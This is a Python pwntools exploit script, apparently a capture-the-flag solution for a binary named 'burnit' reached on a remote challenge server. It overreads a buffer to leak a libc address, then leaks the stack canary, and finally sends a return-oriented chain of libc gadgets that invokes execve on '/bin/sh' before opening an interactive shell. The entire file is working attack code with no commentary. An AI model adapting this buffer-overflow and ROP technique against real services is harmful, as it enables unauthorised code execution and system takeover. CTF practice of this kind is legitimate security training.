#-*- coding: utf-8 -*-
from pwn import *

#t = process('./burnit')
t = remote("burnit.tendollar.kr", 10000)

e = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

std_off = e.symbols['_IO_2_1_stdin_']
s_off = e.symbols['system']
b_off = 0x18cd57

t.recvuntil('4.any comment? : \n')
t.send("4\n")
t.recvuntil('Do you have anything to say to the professor?[y/n]')
t.send("y\n")
payload = "a"*72
t.sendline(payload)
t.recvuntil("a"*72)
stdin = u64(t.recvline()[:-1].ljust(8,'\x00'))
libc = stdin - std_off
system = libc + s_off
binsh = libc + b_off
prdi = libc + 0x0000000000021102
prax = libc + 0x0000000000033544
prsi = libc + 0x00000000000202e8
prdx = libc + 0x0000000000001b92
syscall = libc + 0x00000000000bc375
success(hex(libc))
#success(hex(system))

t.recvuntil('Do you have anything to say to the professor?[y/n]')
t.send("y\n")
payload = "a"*329
t.sendline(payload)
t.recvuntil("a"*329)
canary = u64(t.recv(7).rjust(8,'\x00'))
success(hex(canary))

t.recvuntil('Do you have anything to say to the professor?[y/n]')
t.send("y\n")
payload = "a"*328
payload += p64(canary)
payload += "a"*8

payload += p64(prax)
payload += p64(0x3b)
payload += p64(prdi)
payload += p64(binsh)
payload += p64(prsi)
payload += p64(0)
payload += p64(prdx)
payload += p64(0)
payload += p64(syscall)

t.sendline(payload)
t.recvuntil('Do you have anything to say to the professor?[y/n]')
t.sendline("n")

t.interactive()
